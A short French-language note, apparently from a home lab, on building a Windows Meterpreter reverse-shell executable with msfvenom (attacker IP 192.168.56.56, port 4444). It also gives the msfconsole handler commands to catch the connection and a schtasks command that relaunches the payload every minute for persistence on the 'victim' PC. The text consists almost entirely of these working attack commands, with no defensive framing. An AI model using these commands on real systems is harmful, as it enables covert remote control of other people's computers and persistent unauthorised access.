payload.exe est un reverse shell fait par metasploit via la commande : 

>>>>>>>>>>>>>><<<<<<<<<<<<<<<
/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.56 LPORT=4444 -f exe -o payload.exe
>>>>>>>>>>>>>><<<<<<<<<<<<<<<

IP attaquant : 192.168.56.56
Port attaquant : 4444

Avant d'executer ce payload sur la machine cible, 
Sur la machine attaquant, il faut démarrer l'écoute : 
$msfconsole
	> use exploit/multi/handler
	> set PAYLOAD windows/meterpreter/reverse_tcp
	> set LHOST 192.168.56.56
	> set LPORT 4444
	> run 
On execute le payload sur la machine cible,
on a notre connexion avec le reverse shell sur le PC attaquant

Pour de la persistence même au démarrage du PC victime : 
meterpreter > run exploit/windows/local/persistence LHOST=192.168.56.56 LPORT=4444 PATH=C:\\Secured
(ne fonctionne pas)
DONC 
Création d'une tâche planifiée en commande powershell (toutes les minutes)
Schtasks /create /tn "Secured Tache planifiee" /sc minute /tr "PowerShell -command C:\Secured\payload.exe"
